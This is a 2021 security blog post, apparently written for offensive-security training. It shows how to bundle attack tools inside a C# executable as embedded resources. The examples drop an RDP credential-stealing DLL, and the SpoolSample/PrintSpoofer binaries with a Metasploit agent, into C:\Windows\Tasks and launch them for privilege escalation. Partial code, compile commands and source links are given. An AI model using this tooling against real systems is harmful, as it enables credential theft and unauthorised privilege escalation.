<!DOCTYPE html>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="/css/highlight.min.css">
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    
    
    <title>Taha Draidia | Taking Advantage of Assembly.GetManifestResourceStream for Quick Dirt Hacks</title>
    <script src="/js/highlight.min.js"></script>
    <script> hljs.initHighlightingOnLoad(); </script>
</head><body>
        
        <div id="container" class="container">
<span class="home_button"><a href="/">Back to home</a></span>
<h2 class="note_title">
<a href="/posts/taking-advantage-of-assembly.getmanifestresourcestream-for-quick-dirt-hacks.md/" rel="bookmark"
           title="Permalink to Taking Advantage of Assembly.GetManifestResourceStream for Quick Dirt Hacks">Taking Advantage of Assembly.GetManifestResourceStream for Quick Dirt Hacks</a></h2>


<div class="note_info">
        <div class="origin">
            <strong>Created by:</strong><a href="https://twitter.com/tahadraidia">@tahadraidia</a> || <a href="https://tahadraidia.com">tahadraidia.com</a> 
        </div>
		<br />

        <div class="published" title="2021-12-01 04:32:52 &#43;0000 UTC">
            <strong>Published:</strong> <time datetime="2021-12-01">Dec 1, 2021</time>
        </div>
		<br />

        <div class="tags" title="tags">
        	
        	<strong>Tags:</strong>
        	
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/osep">OSEP</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/c">C#</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/.net">.NET</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/resource-stream">Resource Stream</a>
            
            
        </div>
</div>

<br>
<p>We all get lazy from time to time, but things need to be done, in this post I am going to share with you a dirty hack that I used to avoid translating a solution written in a X programming language to another programming language. The scenario that we are going to cover here is that let&rsquo;s say we wrote a piece of code that does something but requires another tool to achieve the next step of the aimed goal. One option is to download that tool to disk either manually or using the API of the language your are writing the solution or take advantage of resource stream.</p>
<p>I initially started with the first option then I have figured out that it does not scale right, even if it does work, although we need to note that even the second option is not that ideal due to a lack of control, hence using &ldquo;dirty hack&rdquo; expression.</p>
<p>That being said let us dive into the meat of the subject, in order to properly illustrate the idea, we will go through two solutions I have implemented.</p>
<p>C# client for RDPThief:</p>
<p>@0x09AL made a nice tool to steal RDP credential leveraging binary instrumentation, you can find the link of the project in the references section. The tool is a DLL written C++, the usage is quite simple, you inject the DLL into mstsc.exe process. This example fit the description we talked about earlier.</p>
<p>Thanks to .NET Assembly.GetManifestResourceStream() method we can embed RDPThief.dll in our C# project, best of all this works well when loading with .NET assembly in memory. With no further due here is the piece of code that I have found in stackoverflow that allow us to extract embedded resources to disk:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#"><span style="color:#75715e">// Source: https://stackoverflow.com/questions/2989400/store-files-in-c-sharp-exe-file/2989496
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> WriteResourceToFile(<span style="color:#66d9ef">string</span> resourceName, <span style="color:#66d9ef">string</span> fileName)

{

	<span style="color:#66d9ef">try</span>

	{

		<span style="color:#66d9ef">int</span> bufferSize = <span style="color:#ae81ff">4096</span>; <span style="color:#75715e">// set 4KB buffer
</span><span style="color:#75715e"></span>
		<span style="color:#66d9ef">byte</span>[] buffer = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[bufferSize];

		<span style="color:#66d9ef">using</span> (Stream input = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))

		<span style="color:#66d9ef">using</span> (Stream output = <span style="color:#66d9ef">new</span> FileStream(fileName, FileMode.Create))

		{

		<span style="color:#66d9ef">int</span> byteCount = input.Read(buffer, <span style="color:#ae81ff">0</span>, bufferSize);

		<span style="color:#66d9ef">while</span> (byteCount &gt; <span style="color:#ae81ff">0</span>)

		{

		output.Write(buffer, <span style="color:#ae81ff">0</span>, byteCount);

		byteCount = input.Read(buffer, <span style="color:#ae81ff">0</span>, bufferSize);

		}

		}

	}

	<span style="color:#66d9ef">catch</span> (Exception e) { Console.WriteLine(e.Message); }

}
</code></pre></div><p>It is important to note that this is not OPSEC safe, resource stream is not something new, if one of the embedded files is flagged by the anti-virus it is game over.<br>
You can find the complete source code of the RDPThief client here:</p>
<p><a href="https://gist.github.com/tahadraidia/74540f5749d83b2fcbb317187cd18205">https://gist.github.com/tahadraidia/74540f5749d83b2fcbb317187cd18205</a></p>
<p>Compile command used (Mono C# compiler):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mcs -target:exe -platform:x64 -out:rdpthief.exe -resource:RdpThief.dll *.cs
</code></pre></div><p>LPE Through Print Bug:</p>
<p>This implementation leverage the SpoolSample application to privilege escalate by forcing it to run our Metasploit agent. This will use similar approach then before, however, this project requires the agent to be compiled and placed in a specific location of our choice.</p>
<p>This time three files will be embedded in the project, the SpoolSample application, Metasploit agent and our implementation of printSpoofer in .NET, although this good be properly integrated in the code main code base of this project, once again time is precious here.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#"><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">string</span> spoolsample = <span style="color:#e6db74">@&#34;C:\Windows\Tasks\SpoolSample.exe&#34;</span>;

<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">string</span> spoof = <span style="color:#e6db74">@&#34;C:\Windows\Tasks\spoof.exe&#34;</span>;

<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">string</span> local = <span style="color:#e6db74">@&#34;C:\Windows\Tasks\local.exe&#34;</span>;

<span style="color:#66d9ef">string</span> hostname = Dns.GetHostName();

  

<span style="color:#75715e">// Check for file on Disk
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">var</span> files = <span style="color:#66d9ef">new</span> List&lt;String&gt;();

files.Add(spoolsample);

files.Add(spoof);

files.Add(local);

Regex regx = <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;[a-zA-Z0-9]+.exe&#34;</span>);

<span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">string</span> file <span style="color:#66d9ef">in</span> files)

{

	<span style="color:#66d9ef">if</span>(!File.Exists(file))

	{

	MatchCollection matched= regx.Matches(file);

	<span style="color:#66d9ef">if</span>(matched.Count == <span style="color:#ae81ff">1</span>)

	{

	WriteResourceToFile(matched[<span style="color:#ae81ff">0</span>].Value, file);

	}

}

}
</code></pre></div><p>Above code copies files into disk, and the code below is where magic happens.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">...
<span style="color:#75715e">// Give it time.
</span><span style="color:#75715e"></span>
Thread.Sleep(<span style="color:#ae81ff">3000</span>);

  

<span style="color:#75715e">// Bail if files does not exists on disk.
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">if</span> (!File.Exists(spoof) || !File.Exists(spoolsample))

	System.Environment.Exit(<span style="color:#ae81ff">0</span>);

  

<span style="color:#66d9ef">string</span> spoolsampleparam = String.Format(<span style="color:#e6db74">&#34;{0} {0}/pipe/test&#34;</span>, hostname);

  

Runner runner1 = <span style="color:#66d9ef">new</span> Runner(spoof, <span style="color:#e6db74">@&#34;\\.\pipe\test\pipe\spoolss&#34;</span>);

Runner runner2 = <span style="color:#66d9ef">new</span> Runner(spoolsample, spoolsampleparam);

  

Thread th1 = <span style="color:#66d9ef">new</span> Thread(<span style="color:#66d9ef">new</span> ThreadStart(runner1.Execute));

  

th1.Start();

  

<span style="color:#66d9ef">if</span> (th1.ThreadState == System.Threading.ThreadState.Running)

	<span style="color:#66d9ef">new</span> Thread(<span style="color:#66d9ef">new</span> ThreadStart(runner2.Execute)).Start();
...
</code></pre></div><p>The code is self-explanatory, also loads of resources only could be found on this subject, as for the first code, you can find the full version here:</p>
<p><a href="https://gist.github.com/tahadraidia/74540f5749d83b2fcbb317187cd18205">https://gist.github.com/tahadraidia/74540f5749d83b2fcbb317187cd18205</a></p>
<p>Compile command used (Mono C# compiler):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mcs -target:exe -platform:x64 -out:lpeprintbug.exe -resource:spoof.exe -resource:SpoolSample.exe -resource:local.exe *.cs
</code></pre></div><p>References:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.getmanifestresourcestream?view=net-6.0">https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.getmanifestresourcestream?view=net-6.0</a></li>
<li><a href="https://twitter.com/0x09AL">https://twitter.com/0x09AL</a></li>
<li><a href="https://github.com/0x09AL/RdpThief">https://github.com/0x09AL/RdpThief</a></li>
<li><a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></li>
</ul>

  <div class="contact">
    <h2>Contact</h2>
    Please feel free to ping me at <a href="https://twitter.com/tahadraidia">@tahadraidia</a>. Also you can see more of my work at <a href="https://tahadraidia.com">https://tahadraidia.com</a>.
</div>
</br> 
        </div>
        <script> hljs.initHighlightingOnLoad(); </script></body>
</html>
